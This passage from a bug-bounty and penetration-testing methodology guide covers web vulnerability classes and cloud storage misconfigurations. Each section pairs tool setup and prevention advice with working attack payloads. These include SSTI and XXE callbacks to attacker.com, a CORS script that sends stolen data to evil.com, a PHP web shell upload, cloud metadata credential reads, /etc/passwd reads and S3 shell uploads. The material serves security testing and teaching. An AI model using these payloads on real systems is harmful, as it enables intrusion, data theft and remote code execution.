- **Cloud credential leaks** – AWS IAM keys, Azure service principals, GCP service accounts
- **CI/CD pipeline secrets** – GitHub Actions, GitLab CI, Jenkins credentials
- **AI‑assisted secret detection** – ML‑based pattern recognition
- **Real‑time leak monitoring** – `shhgit`, `gronify`, `watchtower`

**Prevention Guidance**:
- Never commit secrets to version control; use `.gitignore`, secret managers
- Rotate keys regularly, implement least‑privilege IAM policies
- Use environment variables, encrypted config files, secret scanning in CI/CD
- Monitor for key usage anomalies, unauthorized access, geographic anomalies

**References**: [GitHub Secret Scanning](https://docs.github.com/en/code-security/secret-scanning), [AWS Security Best Practices](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html), [gitleaks](https://github.com/zricethezav/gitleaks), [trufflehog](https://github.com/trufflesecurity/trufflehog)

---

## 8. Classic Web Vulnerability Scanning

> Comprehensive testing methodology for classic web vulnerabilities (XSS, SQLi, SSRF, SSTI, Open Redirect, CRLF, Path Traversal, XXE, CORS, Host Header Attacks, Cache Poisoning, Request Smuggling, Prototype Pollution, DOM‑Based) based on OWASP, PortSwigger, and 2025‑2026 bug‑bounty trends.

### 8.1 XSS (Cross‑Site Scripting)

**Methodology Overview**:
- **Reflected XSS** – Payload in URL/query reflected immediately (search, errors, redirects)
- **Stored/Persistent XSS** – Payload stored (comments, profiles, forums) and rendered for others
- **DOM‑based XSS** – Client‑side JS manipulates DOM using untrusted sources into sinks
- **mXSS / Mutation XSS** – Browser parsing quirks mutate safe content into executable
- **Blind XSS** – Payload executes in admin panels, logs, support tools (no direct feedback)

**Tool Installation**:
```bash
go install github.com/hahwul/dalfox/v2@latest
pip3 install xsstrike
go install github.com/tomnomnom/waybackurls@latest
go install github.com/tomnomnom/qsreplace@latest
```

**Key Detection Commands**:
```bash
# Extract URLs with parameters
grep "?" crawledurls.txt > paramurls.txt
gf xss paramurls.txt > gf-xss.txt

# Automated XSS scanning with Dalfox
cat gf-xss.txt | dalfox pipe --blind https://your-callback.xss.ht -o dalfox-results.txt

# Manual testing with qsreplace
cat paramurls.txt | qsreplace '"><script>alert(1)</script>' | httpx -silent -match-string "<script>alert(1)</script>"
```

**Exploitation Commands**:
```bash
# Basic payloads
'"><script>alert(1)</script>
<svg onload=alert(1)>
javascript:alert(1)

# Advanced payloads (WAF bypass)
<svg/onload=alert(1)>
<iframe src="javascript:alert(1)">
<math><mi//xlink:href="data:x,<script>alert(1)</script>">
```

**Advanced Techniques (2025‑2026 Trends)**:
- **Polyglot XSS** – Payloads that work in multiple contexts (HTML, JS, CSS)
- **WAF bypass via Unicode normalization, HTML entities, JS obfuscation**
- **XSS via SVG/PDF file uploads, WebSocket messages, PostMessage**
- **Blind XSS with automated callbacks (XSS Hunter, Interact.sh)**

**Prevention Guidance**:
- Input validation, output encoding, Content Security Policy (CSP)
- Use safe DOM APIs, avoid `innerHTML`, `document.write`, `eval`
- Regular security testing, monitoring for XSS attempts
- Educate developers about XSS risks, secure coding practices

**References**: [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html), [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet), [dalfox](https://github.com/hahwul/dalfox)

### 8.2 SQL Injection

**Methodology Overview**:
- **Union‑based SQLi** – Extract data via `UNION SELECT`
- **Error‑based SQLi** – Extract data via error messages
- **Blind Boolean‑based SQLi** – Infer data via true/false responses
- **Blind Time‑based SQLi** – Infer data via timing delays
- **Out‑of‑band SQLi** – Exfiltrate data via DNS/HTTP requests

**Tool Installation**:
```bash
pip3 install sqlmap
go install github.com/assetnote/sqlmap‑cli@latest
```

**Key Detection Commands**:
```bash
# Basic SQLi detection
sqlmap -u "https://target.com/page?id=1" --batch

# Automated detection with ffuf
ffuf -u "https://target.com/page?id=FUZZ" -w /home/pwn/wordlists/sqli.txt -mc 200 -t 50

# Time‑based detection
curl "https://target.com/page?id=1' AND SLEEP(5)--"
```

**Exploitation Commands**:
```bash
# Union‑based extraction
sqlmap -u "https://target.com/page?id=1" --union‑cols 1-10 --dump

# Error‑based extraction
sqlmap -u "https://target.com/page?id=1" --dbms=mysql --dump

# Blind extraction
sqlmap -u "https://target.com/page?id=1" --technique=B --dump

# OS command execution
sqlmap -u "https://target.com/page?id=1" --os‑shell
```

**Advanced Techniques (2025‑2026 Trends)**:
- **NoSQL injection** – MongoDB, CouchDB, Redis injection
- **ORM injection** – SQL injection via ORM frameworks (Hibernate, Sequelize)
- **Second‑order SQLi** – Stored payloads executed later
- **SQLi via GraphQL** – Injection via GraphQL arguments

**Prevention Guidance**:
- Use parameterized queries, prepared statements, stored procedures
- Input validation, output encoding, least privilege database accounts
- Regular security testing, monitoring for SQLi attempts
- Educate developers about SQLi risks, secure coding practices

**References**: [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html), [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection), [sqlmap](https://github.com/sqlmapproject/sqlmap)

### 8.3 SSRF (Server‑Side Request Forgery)

**Methodology Overview**:
- **Basic SSRF** – Access internal services, metadata endpoints
- **Blind SSRF** – No response, detect via out‑of‑band callbacks
- **Advanced SSRF** – Bypass filters, protocol smuggling, cloud metadata access
- **SSRF chaining** – Combine with XSS, SQLi, RCE

**Tool Installation**:
```bash
pip3 install ssrfmap
git clone https://github.com/swisskyrepo/SSRFmap.git
```

**Key Detection Commands**:
```bash
# Test for basic SSRF
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"

# Test for blind SSRF with callback
curl "https://target.com/fetch?url=http://attacker.oastify.com"

# Automated detection with Nuclei
nuclei -t http/ssrf.yaml -l targets.txt
```

**Exploitation Commands**:
```bash
# Access cloud metadata
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Internal service scanning
curl "https://target.com/fetch?url=http://127.0.0.1:8080/admin"

# Protocol smuggling
curl "https://target.com/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a$7%0d%0aCOMMAND%0d%0a"
```

**Advanced Techniques (2025‑2026 Trends)**:
- **Cloud metadata SSRF** – AWS, Azure, GCP metadata service access
- **SSRF via PDF generators, email parsers, webhooks**
- **SSRF bypass via DNS rebinding, IPv6, Unicode encoding**
- **Automated detection with OAST platforms (Burp Collaborator, Interact.sh)**

**Prevention Guidance**:
- Input validation, allow‑list allowed URLs, block internal IPs
- Use network segmentation, firewalls, security groups
- Regular security testing, monitoring for SSRF attempts
- Educate developers about SSRF risks, secure coding practices

**References**: [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html), [PortSwigger SSRF](https://portswigger.net/web-security/ssrf), [SSRFmap](https://github.com/swisskyrepo/SSRFmap)

### 8.4 SSTI (Server‑Side Template Injection)

**Methodology Overview**:
- **Basic SSTI** – Inject template expressions, evaluate arbitrary code
- **Blind SSTI** – No output, detect via out‑of‑band callbacks
- **Advanced SSTI** – Bypass filters, sandbox escapes, RCE
- **Framework‑specific** – Jinja2, Twig, Freemarker, Velocity, Handlebars

**Tool Installation**:
```bash
pip3 install tplmap
git clone https://github.com/epinna/tplmap.git
```

**Key Detection Commands**:
```bash
# Basic detection
curl "https://target.com/page?name={{7*7}}"
curl "https://target.com/page?name=${7*7}"

# Automated detection with tplmap
python3 tplmap.py -u "https://target.com/page?name=*"

# Blind detection with callback
curl "https://target.com/page?name={{request.application.__globals__.__builtins__.__import__('os').popen('curl attacker.com').read()}}"
```

**Exploitation Commands**:
```bash
# RCE via SSTI
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
${"freemarker.template.utility.Execute"?new()("id")}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# File read
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
```

**Advanced Techniques (2025‑2026 Trends)**:
- **SSTI in email templates, PDF generators, report engines**
- **SSTI bypass via Unicode, base64, hex encoding**
- **SSTI chaining with XSS, SSRF, RCE**
- **Automated detection with Nuclei templates**

**Prevention Guidance**:
- Use sandboxed template engines, disable dangerous features
- Input validation, output encoding, regular security testing
- Monitor for SSTI attempts, anomalous template evaluation
- Educate developers about SSTI risks, secure coding practices

**References**: [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection), [tplmap](https://github.com/epinna/tplmap), [SSTI Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

### 8.5 Open Redirect

**Methodology Overview**:
- **Basic open redirect** – Redirect to arbitrary URLs via `redirect`, `next`, `url` parameters
- **Advanced open redirect** – Bypass validation, protocol smuggling, phishing
- **Open redirect chaining** – Combine with XSS, CSRF, OAuth token theft

**Tool Installation**:
```bash
# Built‑into browser dev tools and manual testing
```

**Key Detection Commands**:
```bash
# Basic detection
curl -I "https://target.com/redirect?url=https://evil.com"

# Automated detection with gf
gf redirect paramurls.txt > redirect-urls.txt

# Test for validation bypass
curl -I "https://target.com/redirect?url=//evil.com"
curl -I "https://target.com/redirect?url=/\/evil.com"
```

**Exploitation Commands**:
```bash
# Phishing attack
https://target.com/redirect?url=https://evil.com/login

# OAuth token theft
https://target.com/oauth/authorize?redirect_uri=https://evil.com

# XSS via redirect
https://target.com/redirect?url=javascript:alert(1)
```

**Advanced Techniques (2025‑2026 Trends)**:
- **Open redirect via header injection, meta refresh, JavaScript redirects**
- **Open redirect bypass via Unicode, URL encoding, hostname confusion**
- **Open redirect chaining with XSS, CSRF, OAuth**
- **Automated detection with Nuclei templates**

**Prevention Guidance**:
- Validate redirect URLs, allow‑list allowed domains, block external URLs
- Use relative URLs, secure redirect mechanisms, regular security testing
- Monitor for open redirect attempts, anomalous redirect patterns
- Educate developers about open redirect risks, secure coding practices

**References**: [OWASP Open Redirect Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html), [PortSwigger Open Redirect](https://portswigger.net/web-security/url-redirection)

### 8.6 CRLF Injection

**Methodology Overview**:
- **Basic CRLF injection** – Inject `\r\n` into headers, split responses
- **Advanced CRLF injection** – HTTP response splitting, request smuggling
- **CRLF chaining** – Combine with XSS, cache poisoning, SSRF

**Tool Installation**:
```bash
# Built‑into browser dev tools and manual testing
```

**Key Detection Commands**:
```bash
# Basic detection
curl -I "https://target.com/page?param=value%0d%0aHeader:injected"

# Automated detection with Nuclei
nuclei -t http/crlf.yaml -l targets.txt

# Test for response splitting
curl -I "https://target.com/page?param=value%0d%0a%0d%0a<body>injected</body>"
```

**Exploitation Commands**:
```bash
# Header injection
https://target.com/page?param=value%0d%0aX‑Forwarded‑Host:evil.com

# Response splitting
https://target.com/page?param=value%0d%0a%0d%0a<script>alert(1)</script>

# Cache poisoning
https://target.com/page?param=value%0d%0aX‑Cache:miss
```

**Advanced Techniques (2025‑2026 Trends)**:
- **CRLF via Unicode, base64, hex encoding**
- **CRLF chaining with XSS, cache poisoning, SSRF**
- **Automated detection with Nuclei templates**
- **CRLF in email headers, log files, CSV exports**

**Prevention Guidance**:
- Validate input, encode output, use secure headers, regular security testing
- Monitor for CRLF attempts, anomalous header patterns
- Educate developers about CRLF risks, secure coding practices

**References**: [OWASP CRLF Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/CRLF_Injection_Prevention_Cheat_Sheet.html), [PortSwigger CRLF Injection](https://portswigger.net/web-security/crlf-injection)

### 8.7 Path Traversal

**Methodology Overview**:
- **Basic path traversal** – Access arbitrary files via `../` sequences
- **Advanced path traversal** – Bypass filters, absolute paths, null bytes
- **Path traversal chaining** – Combine with LFI, RFI, RCE

**Tool Installation**:
```bash
# Built‑into browser dev tools and manual testing
```

**Key Detection Commands**:
```bash
# Basic detection
curl "https://target.com/file?name=../../../etc/passwd"

# Automated detection with ffuf
ffuf -u "https://target.com/file?name=FUZZ" -w /home/pwn/wordlists/traversal.txt -mc 200 -t 50

# Test for filter bypass
curl "https://target.com/file?name=....//....//....//etc/passwd"
curl "https://target.com/file?name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
```

**Exploitation Commands**:
```bash
# Read sensitive files
curl "https://target.com/file?name=../../../etc/passwd"
curl "https://target.com/file?name=../../../windows/win.ini"

# Write files (if allowed)
curl -X POST "https://target.com/file?name=../../../tmp/shell.php" -d "<?php system($_GET['c']); ?>"
```

**Advanced Techniques (2025‑2026 Trends)**:
- **Path traversal via Unicode, URL encoding, double encoding**
- **Path traversal in ZIP archives, PDF generators, file uploads**
- **Path traversal chaining with LFI, RFI, RCE**
- **Automated detection with Nuclei templates**

**Prevention Guidance**:
- Validate file paths, allow‑list allowed directories, block `../` sequences
- Use secure file APIs, least privilege file permissions, regular security testing
- Monitor for path traversal attempts, anomalous file access patterns
- Educate developers about path traversal risks, secure coding practices

**References**: [OWASP Path Traversal Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Path_Traversal_Prevention_Cheat_Sheet.html), [PortSwigger Path Traversal](https://portswigger.net/web-security/file-path-traversal)

### 8.8 XXE (XML External Entity)

**Methodology Overview**:
- **Basic XXE** – Read files via external entities
- **Advanced XXE** – SSRF, RCE, denial‑of‑service, out‑of‑band data exfiltration
- **XXE chaining** – Combine with SSRF, RCE, file read

**Tool Installation**:
```bash
pip3 install xxe‑injector
git clone https://github.com/enjoiz/XXEinjector.git
```

**Key Detection Commands**:
```bash
# Basic detection
curl -X POST "https://target.com/xml" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'

# Automated detection with Nuclei
nuclei -t http/xxe.yaml -l targets.txt

# Blind detection with callback
curl -X POST "https://target.com/xml" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">%remote;%int;%send;]>'
```

**Exploitation Commands**:
```bash
# File read
<!DOCTYPE root [<!ENTITY file SYSTEM "file:///etc/passwd">]><root>&file;</root>

# SSRF
<!DOCTYPE root [<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&ssrf;</root>

# RCE (if PHP expect wrapper enabled)
<!DOCTYPE root [<!ENTITY rce SYSTEM "expect://id">]><root>&rce;</root>
```

**Advanced Techniques (2025‑2026 Trends)**:
- **XXE via SVG, PDF, DOCX files**
- **XXE bypass via UTF‑7, CDATA sections, parameter entities**
- **XXE chaining with SSRF, RCE, file read**
- **Automated detection with Nuclei templates**

**Prevention Guidance**:
- Disable external entities, use safe XML parsers, input validation
- Use XML schema validation, regular security testing, monitoring for XXE attempts
- Educate developers about XXE risks, secure coding practices

**References**: [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html), [PortSwigger XXE](https://portswigger.net/web-security/xxe), [XXEinjector](https://github.com/enjoiz/XXEinjector)

### 8.9 CORS (Cross‑Origin Resource Sharing)

**Methodology Overview**:
- **Basic CORS misconfiguration** – Allow arbitrary origins, credentials included
- **Advanced CORS misconfiguration** – Allow null origin, regex bypass, trusted subdomains
- **CORS chaining** – Combine with XSS, CSRF, token theft

**Tool Installation**:
```bash
# Built‑into browser dev tools and manual testing
```

**Key Detection Commands**:
```bash
# Basic detection
curl -H "Origin: https://evil.com" -X OPTIONS "https://target.com/api"

# Automated detection with nuclei
nuclei -t http/cors.yaml -l targets.txt

# Test for null origin
curl -H "Origin: null" -X OPTIONS "https://target.com/api"
```

**Exploitation Commands**:
```bash
# Steal sensitive data
<script>
fetch('https://target.com/api/data', {credentials: 'include'})
  .then(response => response.text())
  .then(data => fetch('https://evil.com/steal?data=' + encodeURIComponent(data)));
</script>

# Bypass CSRF protection
# CORS misconfiguration allows arbitrary origins, enabling CSRF attacks
```

**Advanced Techniques (2025‑2026 Trends)**:
- **CORS via Unicode, IDN homoglyphs, domain confusion**
- **CORS chaining with XSS, CSRF, token theft**
- **Automated detection with Nuclei templates**
- **CORS in mobile apps, desktop apps, IoT devices**

**Prevention Guidance**:
- Validate origins, allow‑list trusted domains, block null origin
- Use secure CORS headers, regular security testing, monitoring for CORS attempts
- Educate developers about CORS risks, secure coding practices

**References**: [OWASP CORS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Origin_Resource_Sharing_Cheat_Sheet.html), [PortSwigger CORS](https://portswigger.net/web-security/cors)

### 8.10 HTTP Host Header Attacks

**Methodology Overview**:
- **Basic host header injection** – Inject malicious host headers, password reset poisoning
- **Advanced host header injection** – Cache poisoning, SSRF, business logic flaws
- **Host header chaining** – Combine with XSS, cache poisoning, SSRF

**Tool Installation**:
```bash
# Built‑into browser dev tools and manual testing
```

**Key Detection Commands**:
```bash
# Basic detection
curl -H "Host: evil.com" "https://target.com"

# Automated detection with nuclei
nuclei -t http/host-header.yaml -l targets.txt

# Test for cache poisoning
curl -H "Host: evil.com" -H "X‑Forwarded‑Host: evil.com" "https://target.com"
```

**Exploitation Commands**:
```bash
# Password reset poisoning
curl -H "Host: evil.com" -X POST "https://target.com/reset" -d "email=victim@target.com"

# Cache poisoning
curl -H "Host: evil.com" -H "X‑Forwarded‑Host: evil.com" "https://target.com/page"

# SSRF
curl -H "Host: 169.254.169.254" "https://target.com"
```

**Advanced Techniques (2025‑2026 Trends)**:
- **Host header via Unicode, IDN homoglyphs, domain confusion**
- **Host header chaining with XSS, cache poisoning, SSRF**
- **Automated detection with Nuclei templates**
- **Host header in mobile apps, desktop apps, IoT devices**

**Prevention Guidance**:
- Validate host headers, allow‑list trusted domains, block internal IPs
- Use secure host header validation, regular security testing, monitoring for host header attempts
- Educate developers about host header risks, secure coding practices

**References**: [PortSwigger HTTP Host Header Attacks](https://portswigger.net/web-security/host-header), [OWASP Host Header Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection)

### 8.11 Web Cache Poisoning

**Methodology Overview**:
- **Basic cache poisoning** – Inject malicious content into cache, serve to other users
- **Advanced cache poisoning** – Bypass cache keys, exploit cache‑specific behaviors
- **Cache poisoning chaining** – Combine with XSS, SSRF, open redirect

**Tool Installation**:
```bash
# Built‑into browser dev tools and manual testing
```

**Key Detection Commands**:
```bash
# Basic detection
curl -H "X‑Forwarded‑Host: evil.com" "https://target.com/page"

# Automated detection with nuclei
nuclei -t http/cache-poisoning.yaml -l targets.txt

# Test for cache key bypass
curl -H "X‑Forwarded‑Host: evil.com" -H "X‑Original‑Host: target.com" "https://target.com/page"
```

**Exploitation Commands**:
```bash
# XSS via cache poisoning
curl -H "X‑Forwarded‑Host: evil.com" -H "X‑Forwarded‑Scheme: http" "https://target.com/page"

# Open redirect via cache poisoning
curl -H "X‑Forwarded‑Host: evil.com" -H "X‑Forwarded‑Scheme: http" "https://target.com/redirect"

# SSRF via cache poisoning
curl -H "X‑Forwarded‑Host: 169.254.169.254" "https://target.com/page"
```

**Advanced Techniques (2025‑2026 Trends)**:
- **Cache poisoning via Unicode, IDN homoglyphs, domain confusion**
- **Cache poisoning chaining with XSS, SSRF, open redirect**
- **Automated detection with Nuclei templates**
- **Cache poisoning in CDNs (CloudFront, Akamai, Fastly)**

**Prevention Guidance**:
- Validate cache keys, allow‑list trusted domains, block internal IPs
- Use secure cache headers, regular security testing, monitoring for cache poisoning attempts
- Educate developers about cache poisoning risks, secure coding practices

**References**: [PortSwigger Web Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning), [OWASP Cache Poisoning](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_HTTP_Cache_Control)

### 8.12 HTTP Request Smuggling

**Methodology Overview**:
- **CL.TE smuggling** – Front‑end uses `Content‑Length`, back‑end uses `Transfer‑Encoding`
- **TE.CL smuggling** – Front‑end uses `Transfer‑Encoding`, back‑end uses `Content‑Length`
- **Advanced smuggling** – HTTP/2 smuggling, cloud‑native smuggling, request smuggling chaining

**Tool Installation**:
```bash
pip3 install smuggler
git clone https://github.com/defparam/smuggler.git
```

**Key Detection Commands**:
```bash
# Test for CL.TE smuggling
printf "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80

# Test for TE.CL smuggling
printf "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80

# Automated detection with smuggler
python3 smuggler.py -u https://target.com
```

**Exploitation Commands**:
```bash
# Bypass security controls
# Smuggle requests to internal endpoints, bypass authentication, etc.

# Cache poisoning via request smuggling
# Poison cache with malicious content

# SSRF via request smuggling
# Smuggle requests to internal services
```

**Advanced Techniques (2025‑2026 Trends)**:
- **HTTP/2 request smuggling** – Different encoding, HPACK compression
- **Cloud‑native request smuggling** – AWS ALB, CloudFront, Azure Front Door specific behaviors
- **Request smuggling chaining** – Combine with XSS, cache poisoning, SSRF
- **Automated detection** – Tools like `smuggler`, `burp‑suite` extensions

**Prevention Guidance**:
- Use HTTP/2 with TLS, disable HTTP/1.1, implement proper request parsing
- Use security headers, regular security testing, monitor for smuggling attempts
- Educate developers about request smuggling risks, secure coding practices
- Implement WAF rules to detect smuggling attempts

**References**: [PortSwigger HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling), [smuggler](https://github.com/defparam/smuggler)

### 8.13 Prototype Pollution

**Methodology Overview**:
- **Basic prototype pollution** – Pollute `Object.prototype` with malicious properties
- **Gadget discovery** – Find code that uses polluted properties dangerously
- **Exploitation** – XSS, RCE, bypass authentication, privilege escalation
- **Advanced techniques** – Pollution via `__proto__`, `constructor.prototype`, `Object.defineProperty`

**Tool Installation**:
```bash
npm install -g pp-finder
git clone https://github.com/BlackFan/client-side-prototype-pollution.git
```

**Key Detection Commands**:
```bash
# Test for prototype pollution via __proto__
curl -X POST "https://target.com/api" -H "Content-Type: application/json" -d '{"__proto__":{"polluted":"yes"}}'

# Test via constructor.prototype
curl -X POST "https://target.com/api" -H "Content-Type: application/json" -d '{"constructor":{"prototype":{"polluted":"yes"}}}'

# Automated detection with pp-finder
pp-finder -u https://target.com/api
```

**Exploitation Commands**:
```bash
# XSS via prototype pollution
curl -X POST "https://target.com/api" -H "Content-Type: application/json" -d '{"__proto__":{"outputFunctionName":"a;console.log(1);//"}}'

# RCE via prototype pollution (if eval/Function used)
curl -X POST "https://target.com/api" -H "Content-Type: application/json" -d '{"__proto__":{"shell":"node -e \\"require('child_process').exec('touch /tmp/pwned')\\""}}'

# Bypass authentication
curl -X POST "https://target.com/api" -H "Content-Type: application/json" -d '{"__proto__":{"isAdmin":true}}'
```

**Advanced Techniques (2025‑2026 Trends)**:
- **Client‑side prototype pollution** – Pollution in browser JavaScript, DOM XSS
- **Server‑side prototype pollution** – Pollution in Node.js, RCE, privilege escalation
- **Prototype pollution chaining** – Combine with XSS, CSRF, authentication bypass
- **Automated gadget discovery** – Tools like `gadget‑inspector` for prototype pollution

**Prevention Guidance**:
- Use `Object.create(null)` for safe objects, avoid `__proto__`, `constructor` in user input
- Implement proper input validation, use JSON schema validation, regular security testing
- Monitor for prototype pollution attempts, anomalous object properties
- Educate developers about prototype pollution risks, secure coding practices

**References**: [PortSwigger Prototype Pollution](https://portswigger.net/web-security/prototype-pollution), [Client‑Side Prototype Pollution](https://github.com/BlackFan/client-side-prototype-pollution), [pp‑finder](https://github.com/dwisiswant0/pp-finder)

### 8.14 DOM‑Based Vulnerabilities

**Methodology Overview**:
- **DOM‑based XSS** – Untrusted data reaches JavaScript sinks (`innerHTML`, `document.write`)
- **DOM‑based open redirect** – Client‑side redirects via `window.location`
- **DOM‑based cookie manipulation** – `document.cookie` with untrusted data
- **DOM‑based client‑side SQL injection** – Web SQL database with untrusted data

**Tool Installation**:
```bash
# Built‑into browser dev tools and manual testing
```

**Key Detection Commands**:
```bash
# Identify DOM sinks in JavaScript
cat jsfiles.txt | grep -E "innerHTML|outerHTML|document\.write|eval|setTimeout|setInterval|Function|location\.|document\.cookie"

# Test for DOM‑based XSS
curl -s "https://target.com/page#<script>alert(1)</script>" | grep -i "script"

# Test for DOM‑based open redirect
curl -s "https://target.com/page#https://evil.com" | grep -i "location.href"
```

**Exploitation Commands**:
```bash
# DOM‑based XSS
https://target.com/page#<script>alert(1)</script>

# DOM‑based open redirect
https://target.com/page#javascript:alert(1)

# DOM‑based cookie manipulation
https://target.com/page#; document.cookie="session=attacker"
```

**Advanced Techniques (2025‑2026 Trends)**:
- **DOM clobbering** – Using `name`/`id` attributes to overwrite global variables
- **DOM‑based prototype pollution** – Pollution via `__proto__` in DOM elements
- **DOM‑based CSRF** – Client‑side CSRF via DOM manipulation
- **Automated detection** – Tools like `dom‑invader`, `burp‑suite` extensions

**Prevention Guidance**:
- Validate and sanitize all client‑side input, use safe DOM APIs
- Implement Content Security Policy (CSP), regular security testing
- Monitor for DOM‑based vulnerabilities, anomalous client‑side behavior
- Educate developers about DOM‑based risks, secure coding practices

**References**: [PortSwigger DOM‑Based Vulnerabilities](https://portswigger.net/web-security/dom-based), [OWASP DOM‑Based XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client_Side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting)

---

## 9. Cloud Assets & Misconfigurations

> Comprehensive cloud asset discovery and misconfiguration testing methodology for AWS S3, Firebase, Azure Blob Storage, GCP Storage, and cloud credential files, incorporating 2025‑2026 trends (cross‑account access, encryption bypass, serverless security, cloud‑native attack vectors).

### 9.1 AWS S3 Bucket Hunting

**Methodology Overview**:
- **Bucket Discovery** – Subdomain enumeration, JavaScript analysis, wordlist generation, OSINT
- **Permission Checking** – Test for public `LIST`, `READ`, `WRITE`, `FULL_CONTROL`
- **Misconfiguration Detection** – Public access, insecure bucket policies, missing encryption, disabled logging
- **Sensitive File Detection** – Scan for `.env`, `.pem`, `.sql`, `.json`, backups, credentials

**Tool Installation**:
```bash
# AWS CLI
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install --update

# S3Scanner
git clone https://github.com/sa7mon/S3Scanner.git
cd S3Scanner
pip3 install -r requirements.txt

# cloud_enum (multi‑cloud)
git clone https://github.com/initstring/cloud_enum.git
cd cloud_enum
pip3 install -r requirements.txt
```

**Key Detection Commands**:
```bash
# Subdomain enumeration for S3 patterns
subfinder -d target.com | grep -E "s3\.amazonaws\.com|s3-[a-z0-9-]+\.amazonaws\.com"

# Bucket discovery with wordlist
python3 s3scanner.py --bucket-file /home/pwn/wordlists/wordlist.txt

# Check bucket permissions
aws s3 ls s3://bucket-name/ --no-sign-request
aws s3 cp s3://bucket-name/file.txt . --no-sign-request

# List bucket contents
aws s3api list-objects-v2 --bucket bucket-name --no-sign-request
```

**Exploitation Commands**:
```bash
# Download all objects
aws s3 sync s3://bucket-name ./local-dir --no-sign-request

# Upload malicious file
aws s3 cp shell.php s3://bucket-name/ --no-sign-request

# Modify bucket policy (if writable)
aws s3api put-bucket-policy --bucket bucket-name --policy file://malicious-policy.json
```

**Advanced Techniques (2025‑2026 Trends)**:
- **S3 Block Public Access bypass** – Via bucket policy, ACL, cross‑account access
- **Cross‑account bucket policies** – Unauthorized AWS account access
- **S3 Express One Zone security** – Regional‑specific misconfigurations
- **Multi‑region replication leaks** – Data exposure via replication settings
- **Encryption bypass** – Missing SSE‑S3, SSE‑KMS, SSE‑C

**Prevention Guidance**:
- Enable S3 Block Public Access, use least‑privilege bucket policies, enable encryption
- Enable server‑access logging, versioning, MFA delete, regular security audits
- Monitor for public buckets, anomalous access patterns, CloudTrail events
- Educate developers about S3 security, secure coding practices

**References**: [AWS Security Best Practices](https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html), [CloudSploit](https://github.com/cloudsploit/scans), [S3Scanner](https://github.com/sa7mon/S3Scanner)

### 9.2 Firebase Database

**Methodology Overview**:
- **Database Discovery** – Find Firebase project IDs, API keys, configuration files
- **Permission Testing** – Test Firebase Realtime Database/Firestore security rules
- **Data Exposure** – Check for publicly readable databases, sensitive data
- **Authentication Bypass** – Bypass security rules, escalate privileges

**Tool Installation**:
```bash
# Firebase CLI
npm install -g firebase-tools

# Firebase‑security‑scanner
git clone https://github.com/MuhammadKhizerJaved/Firebase-Security-Scanner.git
cd Firebase-Security-Scanner
pip3 install -r requirements.txt
```

**Key Detection Commands**:
```bash
# Find Firebase project IDs in JavaScript
curl -s https://target.com | grep -E "firebaseio\.com|firestore\.googleapis\.com"

# Test database permissions
curl -s "https://project-id.firebaseio.com/.json" | jq .
curl -s "https://project-id.firebaseio.com/users.json" | jq .

# Check Firestore permissions
curl -s "https://firestore.googleapis.com/v1/projects/project-id/databases/(default)/documents/users" | jq .
```

**Exploitation Commands**:
```bash
# Read all data (if publicly readable)
curl -s "https://project-id.firebaseio.com/.json" | tee firebase-data.json

# Write data (if publicly writable)
curl -X PUT "https://project-id.firebaseio.com/users/attacker.json" -d '{"email":"attacker@evil.com"}'

# Bypass security rules (if misconfigured)
curl -s "https://project-id.firebaseio.com/admin/users.json?auth=invalid_token"
```

**Advanced Techniques (2025‑2026 Trends)**:
- **Firebase security rule bypass** – Logical flaws, missing validation, wildcard misuse
- **Firebase Cloud Functions abuse** – Trigger functions via database writes
